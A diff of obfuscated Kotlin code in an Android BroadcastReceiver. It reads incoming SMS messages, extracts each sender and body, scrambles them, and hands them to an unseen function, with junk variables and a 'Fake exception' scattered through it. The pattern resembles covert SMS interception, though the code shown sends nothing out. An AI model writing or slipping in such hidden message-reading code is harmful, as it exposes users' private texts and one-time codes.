@@ -43,42 +43,36 @@ class X : BroadcastReceiver() {
                 putString("trash", garbage2)
             }
 
-            if (b != null && b.keySet().isNotEmpty()) {
-                val c: Array<Any?>? = b.get("pdus") as? Array<Any?>?
-                    ?.also { array -> 
-                        array.indices.forEach { i ->
-                            i.toString().toCharArray().size
+            if (b != null) {
+                val c: Array<Any?>? = b.get("pdus") as? Array<Any?>
+                
+                c?.forEach { d ->
+                    try {
+                        val pdu = d as? ByteArray ?: return@forEach
+                        val e = android.telephony.SmsMessage.createFromPdu(pdu)
+                            ?: throw NullPointerException("Fake exception")
+
+                        val f: String = e.originatingAddress?.let { addr ->
+                            addr.map { c -> c.toString() }.joinToString("").reversed()
+                                .substring(0 until addr.length.coerceAtMost(addr.length))
+                        } ?: "Unknown".also { 
+                            println("Unknown sender detected at ${Date()}") 
                         }
-                    }
 
-                c?.forEachIndexed { index, d ->
-                    if (index < Int.MAX_VALUE) {
-                        try {
-                            val e = android.telephony.SmsMessage.createFromPdu(d as ByteArray)
-                                ?: throw NullPointerException("Fake exception")
-
-                            val f: String = e.originatingAddress?.let { addr ->
-                                addr.map { c -> c.toString() }.joinToString("").reversed()
-                                    .substring(0 until addr.length.coerceAtMost(addr.length))
-                            } ?: "Unknown".also { 
-                                println("Unknown sender detected at ${Date()}") 
+                        val g: String = e.messageBody?.replace("a", "4")
+                            ?.replace("e", "3")
+                            ?.replace("i", "1")
+                            ?: "Empty".also {
+                                println("Empty message body")
                             }
 
-                            val g: String = e.messageBody?.replace("a", "4")
-                                ?.replace("e", "3")
-                                ?.replace("i", "1")
-                                ?: "Empty".also {
-                                    println("Empty message body")
-                                }
-
-                            val h = i().run {
-                                substring(0, length)
-                            }
-
-                            j(f, g, h + " " + garbageArray.random())
-                        } catch (e: Exception) {
-                            e.printStackTrace()
+                        val h = i().run {
+                            substring(0, length)
                         }
+
+                        j(f, g, h + " " + garbageArray.random())
+                    } catch (e: Exception) {
+                        e.printStackTrace()
                     }
                 }
             }
